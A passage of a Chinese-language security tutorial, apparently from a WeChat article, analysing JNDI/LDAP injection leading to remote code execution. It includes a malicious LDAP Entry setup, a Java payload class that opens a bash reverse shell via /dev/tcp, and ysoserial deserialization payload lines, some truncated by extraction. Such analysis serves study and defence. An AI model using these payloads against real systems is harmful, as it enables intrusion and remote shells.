102 }
103 }
LDAP存储JAVA对象的⽅式如下：
Java 序列化
JDNI的References
https://mp.weixin.qq.com/s/Pg2bb6385Sv6ptsXAS22-g 5/17
2020/7/27 JNDI之初探 LDAP
Marshalled对象
Remote Location
其中可进⾏配合利⽤⽅式如下：
利⽤Java序列化
利⽤JDNI的References对象引⽤
LDAP可以为其中存储的JAVA对象提供多种属性，具体可参照官⽅说明，部分如下：
https://mp.weixin.qq.com/s/Pg2bb6385Sv6ptsXAS22-g 6/17
2020/7/27 JNDI之初探 LDAP
其中在利⽤JNDI References时，此处主要使⽤的是 javaCodebase 指定远程url,在该
url中包含恶意class，在JNDI中进⾏反序列化触发。
在直接利⽤Java 序列化⽅法时，是利⽤ javaSerializedData 属性，当该属性的 value
值不为空时，会对该值进⾏反序列化处理，当本地存在反序列化利⽤链时，即可触发。
JNDI Reference
攻击流程 参照如下：借⽤下 BlackHat2016 的图。
1、攻击者提供⼀个 LDAP 绝对路径的url并赋予到可利⽤的 JNDI 的 lookup ⽅法中这⾥
直接部署⼀个 LDAP Client 模拟被攻击服务器应⽤即如下所示：
1 String uri = "ldap://127.0.0.1:1389/Th3windObject";
2 Context ctx = new InitialContext();
3 ctx.lookup(uri);
https://mp.weixin.qq.com/s/Pg2bb6385Sv6ptsXAS22-g 7/17
2020/7/27 JNDI之初探 LDAP
2 、 服 务 端 访 问 攻 击 者 构 造 或 可 控 的 LDAP Server 端 ， 并 请 求 到 恶 意 的 JNDI
Reference
构造 JNDI Reference
我的理解是此处的 JNDI Reference 即为 jndiReferenceEntry 根据前⾯提到的信息模
型，这⾥的 构造的 JNDI Reference 即构造 Entry 即服务端代码中的：
1 Entry e = new Entry(base);
2 ...
3 ...
4 e.addAttribute("javaClassName", "th3wind");
5 e.addAttribute("javaCodeBase", cbstring);
6 e.addAttribute("objectClass", "javaNamingReference"); //$NON-NLS-1$
7 e.addAttribute("javaFactory", this.codebase.getRef());
请求 JNDI Reference
在被攻击服务端中请求 JNDI Reference ⽤ lookup 即可直接请求上，但我们这⾥还是
看 下 在 lookup 中 哪 部 分 代 码 请 求 并 利 ⽤ 。 在 lookup 获 取 Entry 后 ， ⼀ 路 传 参 到
c_lookup:
在 doSearchOnce 中发起对传⼊的 url 发起请求，获取对应的 Entry 。
https://mp.weixin.qq.com/s/Pg2bb6385Sv6ptsXAS22-g 8/17
2020/7/27 JNDI之初探 LDAP
同样在该 c_lookup 中判断 javaclassname 、 javaNamingReference 不为空的时候进
⾏ decodeObject 处理。
在 decodeObject 中重新⽣成⼀个 reference ，后续通过 Naming Manager 进⾏载⼊执
⾏恶意 class ⽂件，剩下这部分内容是JNDI的调⽤逻辑了，跟LDAP关系不⼤，这⾥不
多做讨论，⼤概流程图如下：
https://mp.weixin.qq.com/s/Pg2bb6385Sv6ptsXAS22-g 9/17
2020/7/27 JNDI之初探 LDAP
3、服务端 decode 请求到的恶意 JNDI Reference 。
4、服务端从攻击者构造的恶意 Server 请求并实例化 Factory class 。即此处开放的
http请求下的 Th3windObject 。
https://mp.weixin.qq.com/s/Pg2bb6385Sv6ptsXAS22-g 10/17
2020/7/27 JNDI之初探 LDAP
1 import java.lang.Runtime;
2 import java.lang.Process;
3 public class Th3windObject {
4 public Th3windObject(){
5 try{
6 Runtime rt = Runtime.getRuntime();
7 //Runtime.getRuntime().exec("bash -i >& /dev/tcp/127.0.0.1/8
8 //String[] commands = {"/bin/bash", "-c", "'/bin/bash -i >&
9 String[] commands = {"/bin/bash","-c","exec 5<>/dev/tcp/127.
10 Process pc = rt.exec(commands);
11 //System.out.println(commands);
12 pc.waitFor();
13 }catch(Exception e){
14 e.printStackTrace();
15 System.out.println("2222");
16 }
17 }
18 public static void main(String[] argv){
19 Th3windObject e = new Th3windObject();
20 }
21 }
5、执⾏ payloads 。
https://mp.weixin.qq.com/s/Pg2bb6385Sv6ptsXAS22-g 11/17
2020/7/27 JNDI之初探 LDAP
Remote Location
该⽅法不常⽤，此处暂不多做讨论。
Serialized Object
JNDI对通过LDAP传输的Entry属性中的 序列化处理有两处：
⼀处在于前⾯所说的 decodeObject 对 javaSerializedData 属性的处理；
⼀处在于 decodeReference 函数在对普通的 Reference 还原的基础上，还可以进
⼀步对 RefAddress 做还原处理。
javaSerializedData
前⽂有提到，根据 javaSerializedData 不为空的情况， decodeObject 会对对应的字段
进⾏反序列化。即此处在恶意LDAP Server端中增加该属性。
1 e.addAttribute("javaSerializedData", Base64.decode("rO0ABXNyABFqYXZhLnV0a
这 ⾥ 的 payload 出 于 偷 懒 ， 直 接 ⽤ ysoserial.jar 利 ⽤ CommonsCollections6 ⽣
成：
此处的 CommonsCollections6 即前⾯所说存在的本地反序列化漏洞利⽤链，所以在调
⽤的 LDAPClient 本地得导⼊ commons-collections ,我这⾥使⽤的是3.2.1版本。
https://mp.weixin.qq.com/s/Pg2bb6385Sv6ptsXAS22-g 12/17
2020/7/27 JNDI之初探 LDAP
通过该利⽤⽅法可以不⽤恶意web服务，攻击示意图如下：
即：
1. 攻击者提供⼀个LDAP绝对路径的url并赋予到可利⽤的JNDI的 lookup ⽅法中：
2. 服 务 端 访 问 攻 击 者 构 造 或 可 控 的 LDAP Server 端 ， 并 请 求 到 恶 意 的 JNDI
Reference；
https://mp.weixin.qq.com/s/Pg2bb6385Sv6ptsXAS22-g 13/17
2020/7/27 JNDI之初探 LDAP
3. 服务端 decode请求到的恶意 JNDI Reference 并在decode中进⾏反序列化处
理。
调⽤链如下：
javaReferenceAddress
先来⼀张调⽤链的图：
https://mp.weixin.qq.com/s/Pg2bb6385Sv6ptsXAS22-g 14/17
2020/7/27 JNDI之初探 LDAP
在该调⽤⽅式中，该可⽤于反序列化的属性为 javaReferenceAddress ,payload如下：
1 e.addAttribute("javaReferenceAddress", "$1$String$$"+new BASE64Encoder().
在 Reference decodeReference 对该属性进⾏处理时对处理字符串有条件要求：
⾸先要求 javaSerializedData 为空；
其次要求 javaRemoteLocation 为空。
在进⼊ decodeReference 中进⾏字符串处理要求如下：必备属性：
https://mp.weixin.qq.com/s/Pg2bb6385Sv6ptsXAS22-g 15/17
2020/7/27 JNDI之初探 LDAP
1 javaClassName
2 javaReferenceAddress
校验 javafactory 是否存在
(cid:0)(cid:0)(cid:0)(cid:0)(cid:0)(cid:0)(cid:0)(cid:0)(cid:0)(cid:0)(cid:0)(cid:0)(cid:0)(cid:0)(cid:0)(cid:0)(cid:0)(cid:0)(cid:0)(cid:0)(cid:0)(cid:0)(cid:0)(cid:0)(cid:0)(cid:0)
在对 javaReferenceAddress 处理流程如下：
1. 第⼀个字符为分隔符；
2. 第⼀个分隔符与第⼆个分隔符之间，表示Reference的position，为int类型，也
就是这个位置必须是数字；
3. 第⼆个分隔符与第三个分隔符之间，表示type类型；
4. 检测第三个分隔符后是否有第四个分隔符即双分隔符的形式，是则进⼊反序列化的操
作；
5. 序列化数据⽤base64编码，所以在序列化前会进⾏⼀次base64解码。
参考
从⼀次漏洞挖掘⼊⻔Ldap注⼊
【技术分享】BlackHat2016——JDNI注⼊/LDAP Entry污染攻击技术研究
从JNDI / LDAP操作到远程执⾏代码的梦想之旅
搭建ldap_server
JNDI with LDAP
https://mp.weixin.qq.com/s/Pg2bb6385Sv6ptsXAS22-g 16/17
2020/7/27 JNDI之初探 LDAP
https://mp.weixin.qq.com/s/Pg2bb6385Sv6ptsXAS22-g 17/17